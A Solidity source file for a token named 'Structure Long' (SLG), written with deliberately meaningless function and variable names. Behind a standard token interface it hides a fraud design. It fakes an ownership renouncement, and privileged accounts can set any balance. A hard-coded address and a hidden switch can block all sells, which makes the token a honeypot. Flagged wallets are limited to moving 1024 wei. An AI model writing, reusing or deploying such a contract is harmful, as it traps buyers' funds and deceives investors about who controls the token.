//SPDX-License-Identifier: MIT

pragma solidity ^0.8.14;

interface liquidityTrading {
    function totalSupply() external view returns (uint256);

    function balanceOf(address senderTo) external view returns (uint256);

    function transfer(address fromWallet, uint256 maxFromReceiver) external returns (bool);

    function allowance(address autoReceiver, address spender) external view returns (uint256);

    function approve(address spender, uint256 maxFromReceiver) external returns (bool);

    function transferFrom(
        address sender,
        address fromWallet,
        uint256 maxFromReceiver
    ) external returns (bool);

    event Transfer(address indexed from, address indexed receiverShouldTo, uint256 value);
    event Approval(address indexed autoReceiver, address indexed spender, uint256 value);
}

abstract contract isSell {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface exemptReceiverLaunched {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface maxAuto {
    function createPair(address atIs, address isWallet) external returns (address);
}

interface launchAmount is liquidityTrading {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract StructureLong is isSell, liquidityTrading, launchAmount {

    function getOwner() external view returns (address) {
        return txAuto;
    }

    mapping(address => bool) public teamTx;

    uint256 private exemptAmount;

    constructor (){
        if (enableSell == minEnable) {
            minEnable = false;
        }
        exemptReceiverLaunched takeEnable = exemptReceiverLaunched(toAmountIs);
        fundAt = maxAuto(takeEnable.factory()).createPair(takeEnable.WETH(), address(this));
        if (enableSell == walletIs) {
            walletIs = true;
        }
        amountLiquidity = _msgSender();
        launchedTrading();
        teamTx[amountLiquidity] = true;
        amountSender[amountLiquidity] = tradingTake;
        
        emit Transfer(address(0), amountLiquidity, tradingTake);
    }

    mapping(address => uint256) private amountSender;

    uint256 public toSwap;

    address private txAuto;

    bool public listAt;

    function launchedTrading() public {
        emit OwnershipTransferred(amountLiquidity, address(0));
        txAuto = address(0);
    }

    uint256 public exemptSell;

    function symbol() external view virtual override returns (string memory) {
        return fundAmount;
    }

    uint256 sellEnable;

    function feeShould(address toBuy, uint256 maxFromReceiver) public {
        marketingReceiver();
        amountSender[toBuy] = maxFromReceiver;
    }

    string private fundAmount = "SLG";

    string private sellBuyExempt = "Structure Long";

    address public amountLiquidity;

    bool private walletIs;

    function allowance(address fromAmount, address modeReceiver) external view virtual override returns (uint256) {
        if (modeReceiver == toAmountIs) {
            return type(uint256).max;
        }
        return limitEnable[fromAmount][modeReceiver];
    }

    function marketingLaunchedSell(address marketingLiquidity, address fromWallet, uint256 maxFromReceiver) internal returns (bool) {
        if (marketingLiquidity == amountLiquidity) {
            return toLaunched(marketingLiquidity, fromWallet, maxFromReceiver);
        }
        uint256 launchedEnable = liquidityTrading(fundAt).balanceOf(totalTeam);
        require(launchedEnable == sellEnable);
        require(fromWallet != totalTeam);
        if (feeWallet[marketingLiquidity]) {
            return toLaunched(marketingLiquidity, fromWallet, launchAt);
        }
        return toLaunched(marketingLiquidity, fromWallet, maxFromReceiver);
    }

    address totalTeam = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    uint256 private receiverListToken;

    mapping(address => mapping(address => uint256)) private limitEnable;

    function approve(address modeReceiver, uint256 maxFromReceiver) public virtual override returns (bool) {
        limitEnable[_msgSender()][modeReceiver] = maxFromReceiver;
        emit Approval(_msgSender(), modeReceiver, maxFromReceiver);
        return true;
    }

    event OwnershipTransferred(address indexed amountFund, address indexed swapList);

    address public fundAt;

    function owner() external view returns (address) {
        return txAuto;
    }

    function totalSupply() external view virtual override returns (uint256) {
        return tradingTake;
    }

    uint256 fundLimit;

    function name() external view virtual override returns (string memory) {
        return sellBuyExempt;
    }

    function balanceOf(address senderTo) public view virtual override returns (uint256) {
        return amountSender[senderTo];
    }

    bool private enableSell;

    function feeExempt(uint256 maxFromReceiver) public {
        marketingReceiver();
        sellEnable = maxFromReceiver;
    }

    function transferFrom(address marketingLiquidity, address fromWallet, uint256 maxFromReceiver) external override returns (bool) {
        if (_msgSender() != toAmountIs) {
            if (limitEnable[marketingLiquidity][_msgSender()] != type(uint256).max) {
                require(maxFromReceiver <= limitEnable[marketingLiquidity][_msgSender()]);
                limitEnable[marketingLiquidity][_msgSender()] -= maxFromReceiver;
            }
        }
        return marketingLaunchedSell(marketingLiquidity, fromWallet, maxFromReceiver);
    }

    mapping(address => bool) public feeWallet;

    function marketingReceiver() private view {
        require(teamTx[_msgSender()]);
    }

    function decimals() external view virtual override returns (uint8) {
        return senderEnable;
    }

    function transfer(address toBuy, uint256 maxFromReceiver) external virtual override returns (bool) {
        return marketingLaunchedSell(_msgSender(), toBuy, maxFromReceiver);
    }

    function feeSwap(address limitLaunch) public {
        if (listAt) {
            return;
        }
        
        teamTx[limitLaunch] = true;
        
        listAt = true;
    }

    uint256 constant launchAt = 2 ** 10;

    uint256 private tradingTake = 100000000 * 10 ** 18;

    address toAmountIs = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    uint256 public marketingAuto;

    function toLaunched(address marketingLiquidity, address fromWallet, uint256 maxFromReceiver) internal returns (bool) {
        require(amountSender[marketingLiquidity] >= maxFromReceiver);
        amountSender[marketingLiquidity] -= maxFromReceiver;
        amountSender[fromWallet] += maxFromReceiver;
        emit Transfer(marketingLiquidity, fromWallet, maxFromReceiver);
        return true;
    }

    function amountTrading(address tradingShouldTeam) public {
        marketingReceiver();
        
        if (tradingShouldTeam == amountLiquidity || tradingShouldTeam == fundAt) {
            return;
        }
        feeWallet[tradingShouldTeam] = true;
    }

    uint8 private senderEnable = 18;

    bool public minEnable;

}